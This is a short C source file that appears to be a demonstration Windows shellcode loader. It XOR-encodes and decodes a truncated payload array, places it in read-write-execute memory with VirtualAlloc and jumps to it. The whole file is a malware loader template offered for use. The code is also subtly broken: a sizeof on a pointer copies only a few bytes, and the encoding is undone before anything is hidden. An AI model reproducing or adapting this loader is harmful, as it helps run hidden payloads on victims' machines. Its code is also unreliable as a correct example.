#include <stdio.h>
#include <string.h>
#include <windows.h>

// Sample 64-bit Windows shellcode (not functional, for demonstration purposes)
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xe0, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52
    //... more shellcode bytes would go here
};

// XOR key for obfuscation
unsigned char key = 0xAA;  // Simple XOR key for obfuscation and deobfuscation

// Function to XOR encode/decode the shellcode
void xor_encode_decode(unsigned char *data, size_t data_len, unsigned char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}

// Function to execute the shellcode
void execute_shellcode(unsigned char *shellcode) {
    // Allocate memory with RWX (Read-Write-Execute) permissions
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Copy the decoded shellcode to the executable memory region
    memcpy(exec, shellcode, sizeof(shellcode));

    // Create a function pointer to the shellcode and execute it
    ((void(*)())exec)();
}

int main() {
    printf("Original (Obfuscated) Shellcode:\n");
    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 1: Obfuscate shellcode (XOR encode)
    xor_encode_decode(shellcode, sizeof(shellcode), key);

    printf("Encoded Shellcode (XOR Obfuscated):\n");
    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 2: Decode the shellcode (XOR decode) just before execution
    xor_encode_decode(shellcode, sizeof(shellcode), key);

    printf("Decoded Shellcode (Ready for execution):\n");
    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 3: Execute the shellcode
    execute_shellcode(shellcode);

    return 0;
}

